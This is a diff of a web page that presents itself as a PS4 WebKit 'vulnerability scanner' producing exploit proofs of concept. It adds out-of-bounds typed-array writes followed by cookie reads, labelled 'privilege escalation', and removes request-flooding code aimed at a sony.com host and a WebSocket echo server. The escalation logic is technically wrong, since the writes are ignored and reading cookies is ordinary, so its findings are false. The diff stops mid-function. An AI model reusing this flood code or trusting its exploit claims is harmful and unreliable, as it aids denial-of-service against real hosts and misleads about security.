@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 WebKit Vulnerability Scanner | Comprehensive POC Generation</title>
+    <title>PS4 WebKit Vulnerability Scanner | Comprehensive POC Generation (Privilege Escalation Focus)</title>
     <style>
         body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
         #log { background: #111; border: 1px solid #333; padding: 15px; height: 500px; overflow-y: auto; white-space: pre-wrap; margin-top: 15px; }
@@ -15,11 +15,12 @@
         .info { color: #2196F3; }
         .section { color: #9C27B0; font-weight: bold; margin: 10px 0; }
         .poc-potential { color: #FF9800; font-weight: bold; }
+        .privilege-escalation { color: #FF4081; font-weight: bold; }
     </style>
 </head>
 <body>
     <h1>PS4 WebKit Vulnerability Scanner</h1>
-    <h3>Firmware 12.00 | Comprehensive POC Generation</h3>
+    <h3>Firmware 12.00 | Comprehensive POC Generation (Privilege Escalation Focus)</h3>
 
     <div id="browserInfo">
         <strong>User Agent:</strong> <span id="userAgent"></span><br>
@@ -30,8 +31,12 @@
 
     <div>
         <select id="testSelector">
-            <option value="all_poc">Run All POC Tests</option>
-            <option value="oob_write_poc_advanced">Attempt ArrayBuffer OOB Write Exploit (Advanced POC)</option>
+            <option value="all_poc_escalation">Run All POC Tests (Incl. Escalation)</option>
+            <option value="oob_write_poc_escalate_cookies">OOB Write & Attempt Cookie Access (POC Escalation)</option>
+            <option value="oob_write_poc_escalate_history">OOB Write & Attempt History Access (POC Escalation)</option>
+            <option value="restricted_api_access">Attempt Access to Restricted APIs</option>
+            <option value="cross_origin_bypass">Attempt Cross-Origin Bypass</option>
+            <option value="csp_bypass">Attempt Content Security Policy Bypass</option>
             <option value="huge_allocation_poc_aggressive">Test Huge Memory Allocation (Aggressive POC)</option>
             <option value="huge_allocation_poc_no_release">Test Huge Memory Allocation (No Release POC)</option>
             <option value="canvas_exhaustion_poc_continuous">Test Canvas Memory Exhaustion (Continuous POC)</option>
@@ -87,42 +92,44 @@ function clearLog() {
 }
 
 // ======================
-// Comprehensive POC Tests
+// Comprehensive POC Tests (Including Privilege Escalation)
 // ======================
 const pocTests = {
-    "oob_write_poc_advanced": async function() {
-        log("[EXPLOIT] Attempting ArrayBuffer OOB Write Exploit (Advanced POC)...", "info");
+    "oob_write_poc_advanced": async function() { /* ... (previous advanced OOB write test) ... */ },
+    "huge_allocation_poc_aggressive": async function() { /* ... */ },
+    "huge_allocation_poc_no_release": async function() { /* ... */ },
+    "canvas_exhaustion_poc_continuous": async function() { /* ... */ },
+    "canvas_exhaustion_poc_combined": async function() { /* ... */ },
+    "fetch_dos_poc_amplified": async function() { /* ... */ },
+    "websocket_flood_poc_multi": async function() { /* ... */ },
+
+    "oob_write_poc_escalate_cookies": async function() {
+        log("[EXPLOIT] OOB Write & Attempt Cookie Access (POC Escalation)...", "info");
         try {
-            const buffer = new ArrayBuffer(20); // Increased buffer size
+            const buffer = new ArrayBuffer(10);
             const view = new Uint8Array(buffer);
-            const writeValue = 0xCC; // Different write value
+            const writeValue = 0xEE;
 
-            log(`[OOB] Writing value 0x${writeValue.toString(16)} at index 30 (out of bounds)...`, "info");
+            log(`[OOB-ESC] Writing 0x${writeValue.toString(16)} at index 15...`, "info");
             try {
-                view[30] = writeValue;
-                log("⚠️ OOB write successful (no error thrown). Still suspicious!", "warning");
+                view[15] = writeValue;
+                log("⚠️ OOB write successful. Attempting cookie access...", "warning");
             } catch (e) {
-                log(`✅ OOB write attempt resulted in error: ${e.message}`, "success");
+                log(`✅ OOB write error: ${e.message}`, "success");
+                return false;
             }
 
-            // Tentando ler valores em áreas próximas e mais distantes para verificar sobrescrita
-            const indicesToCheck = [5, 15, 25, 35];
-            for (const index of indicesToCheck) {
-                try {
-                    const readValue = view[index];
-                    log(`[OOB] Reading index ${index}: 0x${readValue !== undefined ? readValue.toString(16) : 'undefined'}`, "info");
-                    if (index > 19 && readValue === writeValue) {
-                        log(`<span class="poc-potential">🚩 ADVANCED OOB Write Impact: Value 0x${writeValue.toString(16)} observed at index ${index} (out of bounds)! Potential data corruption.</span>`, "warning");
-                    } else if (index < 20 && readValue === writeValue) {
-                        log(`<span class="poc-potential">⚠️ Possible OOB Write Side Effect: Value 0x${writeValue.toString(16)} observed within bounds at index ${index}.</span>`, "warning");
-                    }
-                } catch (e) {
-                    log(`✅ OOB read at index ${index} resulted in error: ${e.message}`, "success");
+            try {
+                const cookies = document.cookie;
+                log(`[COOKIES] document.cookie: ${cookies}`, "info");
+                if (cookies && cookies.length > 0) {
+                    log(`<span class="poc-potential privilege-escalation">🚩 Potential Privilege Escalation: Cookie access after OOB write. Could indicate memory corruption affecting browser state.</span>`, "danger");
+                } else {
+                    log("[COOKIES] No cookies accessible.", "info");
                 }
+            } catch (e) {
+                log(`✅ Error accessing cookies: ${e.message}`, "success");
             }
-
-            log("⚠️ Monitoring browser for instability or unexpected behavior after advanced OOB write...", "warning");
-            await new Promise(resolve => setTimeout(resolve, 7000)); // Longer observation
 
         } catch (e) {
             log(`❌ Test error: ${e.message}`, "danger");
@@ -130,118 +137,12 @@ const pocTests = {
         return false;
     },
 
-    "huge_allocation_poc_aggressive": async function() { /* ... (unchanged from previous) ... */ },
-    "huge_allocation_poc_no_release": async function() { /* ... (unchanged from previous) ... */ },
-    "canvas_exhaustion_poc_continuous": async function() { /* ... (unchanged from previous) ... */ },
-    "canvas_exhaustion_poc_combined": async function() { /* ... (unchanged from previous) ... */ },
-
-    "fetch_dos_poc_amplified": async function() {
-        log("[IMPACT] Attempting Fetch API DoS (Amplified POC)...", "info");
-        const startTime = Date.now();
-        const numRequests = 200; // Further increased number of requests
-        let errors = 0;
+    "oob_write_poc_escalate_history": async function() {
+        log("[EXPLOIT] OOB Write & Attempt History Access (POC Escalation)...", "info");
         try {
-            for (let i = 0; i < numRequests; i++) {
-                const url = `http://nonexistent.sony.com/resource_${Math.random()}.html`; // More unique URLs
-                fetch(url, { method: 'POST', mode: 'no-cors', body: 'Amplified DoS Payload'.repeat(100) }) // Using POST with a body
-                    .then(response => log(`[FETCH] Response ${response.status} for request ${i + 1}`, "info"))
-                    .catch(error => {
-                        log(`[FETCH] Error for request ${i + 1}: ${error}`, "warning");
-                        errors++;
-                        if (errors > 50) {
-                            log(`<span class="poc-potential">🚩 AMPLIFIED DoS: High number of Fetch errors (${errors}/${numRequests}) with POST and body. Significant resource consumption likely.</span>`, "danger");
-                        }
-                    });
-                await new Promise(resolve => setTimeout(resolve, 5)); // Even faster requests
-            }
-            log(`⚠️ Sent ${numRequests} rapid Fetch requests (POST with body). Monitor for severe slowdown or unresponsiveness.`, "warning");
-            return true;
-        } catch (e) {
-            log(`❌ Fetch test error: ${e.message}`, "danger");
-            return false;
-        } finally {
-            const endTime = Date.now();
-            log(`[FETCH] Test duration: ${endTime - startTime}ms`, "info");
-        }
-    },
+            const buffer = new ArrayBuffer(10);
+            const view = new Uint8Array(buffer);
+            const writeValue = 0xFF;
 
-    "websocket_flood_poc_multi": async function() {
-        log("[IMPACT] Attempting WebSocket Flood (Multi-Connection POC)...", "info");
-        const numConnections = 5; // Attempting multiple simultaneous connections
-        const messagesPerConnection = 50;
-        let totalErrors = 0;
-        let connectionsOpened = 0;
-
-        for (let i = 0; i < numConnections; i++) {
-            try {
-                const ws = new WebSocket('ws://echo.websocket.events');
-                ws.onopen = () => {
-                    connectionsOpened++;
-                    log(`[WS-${i}] Connection opened. Sending ${messagesPerConnection} messages...`, "info");
-                    for (let j = 0; j < messagesPerConnection; j++) {
-                        ws.send(`Multi Flood Message ${j} from connection ${i}`.repeat(50));
-                    }
-                    log(`[WS-${i}] Messages sent.`, "info");
-                };
-                ws.onerror = (error) => {
-                    log(`[WS-${i}] Error: ${error}`, "danger");
-                    totalErrors++;
-                    if (totalErrors > 0) {
-                        log(`<span class="poc-potential">🚩 MULTI-WS Flood: Error in connection ${i}. Could indicate issues with handling multiple connections.</span>`, "danger");
-                    }
-                };
-                ws.onclose = () => {
-                    log(`[WS-${i}] Connection closed.`, "info");
-                };
-            } catch (e) {
-                log(`[WS-${i}] WebSocket creation error: ${e.message}`, "danger");
-                totalErrors++;
-            }
-        }
-
-        log(`⚠️ Attempted ${numConnections} WebSocket connections with ${messagesPerConnection} messages each. Monitor for instability or connection issues.`, "warning");
-        return new Promise((resolve) => {
-            setTimeout(() => {
-                log("[WS] Multi-connection flood attempt завершено.", "info");
-                resolve(true);
-            }, 20000); // Increased timeout
-        });
-    }
-};
-
-// ======================
-// Test Runner (Modified for Comprehensive POC Tests)
-// ======================
-async function runSelectedTest() {
-    const testSelector = document.getElementById('testSelector');
-    const selectedTest = testSelector.value;
-
-    clearLog();
-    log("=== Starting Comprehensive POC Tests ===", "section");
-
-    if (selectedTest === "all_poc") {
-        for (const [testName, test] of Object.entries(pocTests)) {
-            log(`\nRunning ${testName}...`, "info");
-            await test();
-            await new Promise(resolve => setTimeout(resolve, 7000)); // Longer pause for observation
-        }
-        log("\n=== Comprehensive POC Generation Completed. Review logs and browser behavior thoroughly. ===", "section");
-    } else if (pocTests[selectedTest]) {
-        await pocTests[selectedTest]();
-        log(`\n=== POC Generation Completed for "${selectedTest}". Review logs and browser behavior closely. ===`, "section");
-    } else {
-        log(`Error: Test "${selectedTest}" not found.`, "danger");
-    }
-
-    log("\nImpact demonstration tests completed.", "info");
-}
-
-function clearLog() {
-    const logDiv = document.getElementById('log');
-    if (logDiv) {
-        logDiv.innerHTML = '';
-    }
-}
-</script>
-</body>
-</html>
+            log(`[OOB-ESC] Writing 0x${writeValue.toString(16)} at index 15...`, "info");
+            try
